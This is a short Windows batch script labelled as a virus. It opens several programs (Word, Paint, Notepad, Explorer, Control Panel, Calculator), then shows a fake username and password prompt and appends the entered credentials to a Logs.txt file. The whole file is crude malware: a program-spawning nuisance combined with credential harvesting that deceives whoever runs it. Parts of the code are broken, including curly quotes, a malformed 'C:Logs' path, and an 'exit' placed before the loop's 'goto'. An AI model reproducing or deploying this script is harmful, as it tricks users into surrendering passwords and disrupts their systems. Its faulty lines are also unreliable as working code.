@echo off 
:virus
start winword
start mspaint 
 start notepad
start explorer 
start control
 start calc 
cd “C:Logs”
set /p user=Username:
 set /p pass=Password:
echo Username=%user%" Password="%pass%" >> Logs.txt
exit
goto virus